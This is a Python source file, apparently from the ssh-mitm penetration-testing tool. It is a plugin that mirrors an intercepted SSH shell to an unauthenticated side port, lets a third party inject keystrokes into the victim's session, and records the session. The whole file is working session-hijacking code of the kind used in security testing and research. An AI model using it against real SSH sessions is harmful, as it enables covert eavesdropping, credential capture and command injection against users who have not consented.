import logging
import os
import select
import socket
import threading
import time
from typing import TYPE_CHECKING, Optional

import paramiko
from colored.colored import attr, fg  # type: ignore[import-untyped]

from sshmitm.forwarders.ssh import SSHForwarder
from sshmitm.logging import Colors
from sshmitm.plugins.ssh.terminallogs import ScriptLogFormat, TerminalLogFormat

if TYPE_CHECKING:
    import sshmitm


class InjectServer(paramiko.ServerInterface):
    def __init__(self, server_channel: paramiko.channel.Channel) -> None:
        self.server_channel = server_channel
        self.injector_channel: Optional[paramiko.channel.Channel] = None

    def check_auth_none(self, username: str) -> int:
        del username
        return paramiko.common.AUTH_SUCCESSFUL

    def check_channel_request(self, kind: str, chanid: int) -> int:
        del chanid
        if kind == "session":
            return paramiko.common.OPEN_SUCCEEDED
        return paramiko.common.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel: paramiko.channel.Channel) -> bool:
        self.injector_channel = channel
        return True

    def check_channel_pty_request(  # pylint: disable=too-many-arguments
        self,
        channel: paramiko.channel.Channel,
        term: bytes,
        width: int,
        height: int,
        pixelwidth: int,
        pixelheight: int,
        modes: bytes,
    ) -> bool:
        del channel
        del term
        del width
        del height
        del pixelwidth
        del pixelheight
        del modes
        return True


class SSHMirrorForwarder(SSHForwarder):
    """Mirrors the shell to another client"""

    HOST_KEY_LENGTH = 2048

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.argument_group()
        plugin_group.add_argument(
            "--ssh-mirrorshell-net",
            dest="ssh_mirrorshell_net",
            help="local address/interface where injector sessions are served",
        )
        plugin_group.add_argument("--ssh-mirrorshell-key", dest="ssh_mirrorshell_key")
        plugin_group.add_argument(
            "--store-ssh-session",
            dest="store_ssh_session",
            action="store_true",
            help="store ssh session in scriptreplay format",
        )
        plugin_group.add_argument(
            "--ssh-terminal-log-formatter",
            dest="ssh_terminal_log_formatter",
            choices=["script"],
            help="terminal log format for captured ssh session",
        )

    def __init__(self, session: "sshmitm.session.Session") -> None:
        super().__init__(session)
        if self.args.ssh_mirrorshell_key:
            self.args.ssh_mirrorshell_key = os.path.expanduser(
                self.args.ssh_mirrorshell_key
            )

        self.sessionlog: Optional[TerminalLogFormat] = None
        if self.args.store_ssh_session and self.session.session_log_dir:
            try:
                self.sessionlog = ScriptLogFormat(
                    os.path.join(self.session.session_log_dir, "terminal_sessions")
                )
            except Exception:  # pylint: disable=broad-exception-caught
                logging.exception(
                    "Error creating session log dir. terminal logging disabled"
                )
                self.sessionlog = None

        self.injector_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.injector_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.injector_sock.bind((self.args.ssh_mirrorshell_net, 0))
        self.injector_sock.listen(5)
        self.inject_server: Optional[InjectServer] = None

        self.injector_client_sock: Optional[socket.socket] = None

        self.conn_thread = threading.Thread(target=self.injector_connect)
        self.conn_thread.start()

    def injector_connect(self) -> None:
        inject_host, inject_port = self.injector_sock.getsockname()
        logging.info(
            "%s created mirrorshell on port %s. connect with: %s",
            Colors.emoji("information"),
            inject_port,
            Colors.stylize(
                f"ssh -p {inject_port} {inject_host}", fg("light_blue") + attr("bold")
            ),
        )
        try:
            while self.session.running:
                readable = select.select([self.injector_sock], [], [], 0.5)[0]
                if len(readable) == 1 and readable[0] is self.injector_sock:
                    try:
                        self.injector_client_sock, _ = self.injector_sock.accept()
                    except socket.error:
                        break

                    mirror_transport = paramiko.Transport(self.injector_client_sock)
                    mirror_transport.set_gss_host(socket.getfqdn(""))

                    mirror_transport.load_server_moduli()
                    if self.args.ssh_mirrorshell_key:
                        mirror_transport.add_server_key(
                            paramiko.RSAKey(filename=self.args.ssh_mirrorshell_key)
                        )
                    else:
                        mirror_transport.add_server_key(
                            paramiko.RSAKey.generate(bits=self.HOST_KEY_LENGTH)
                        )

                    self.inject_server = InjectServer(self.server_channel)
                    event = threading.Event()
                    mirror_transport.start_server(
                        event=event, server=self.inject_server
                    )
                    injector_channel = None
                    while not injector_channel:
                        injector_channel = mirror_transport.accept(0.5)
                    event.wait()
                    while True:
                        if (
                            self.inject_server.injector_channel
                            and self.inject_server.injector_channel.recv_ready()
                        ):
                            buf = self.inject_server.injector_channel.recv(self.BUF_LEN)
                            self.server_channel.sendall(buf)
                        else:
                            time.sleep(0.1)

        except Exception:  # pylint: disable=broad-exception-caught
            logging.exception(
                "mirrorshell - injector connection suffered an unexpected error"
            )

    def close_session(self, channel: paramiko.Channel) -> None:
        super().close_session(channel)
        # close sessions and inject server connections
        self.injector_sock.close()
        if (
            self.inject_server is not None
            and self.inject_server.injector_channel is not None
        ):
            self.inject_server.injector_channel.get_transport().close()
        self.conn_thread.join()
        # close log files
        if self.sessionlog:
            self.sessionlog.close()

    def stdin(self, text: bytes) -> bytes:
        # write the buffer to the log file
        if self.sessionlog:
            self.sessionlog.stdin(text)
        return text

    def stdout(self, text: bytes) -> bytes:
        # write the buffer to the log file
        if self.sessionlog:
            self.sessionlog.stdout(text)
        # send buffer to connected injection server
        if (
            self.inject_server is not None
            and self.inject_server.injector_channel is not None
        ):
            self.inject_server.injector_channel.sendall(text)
        return text

    def stderr(self, text: bytes) -> bytes:
        # write the buffer to the log file
        if self.sessionlog:
            self.sessionlog.stderr(text)
        # send buffer to connected injection server
        if (
            self.inject_server is not None
            and self.inject_server.injector_channel is not None
        ):
            self.inject_server.injector_channel.sendall(text)
        return text
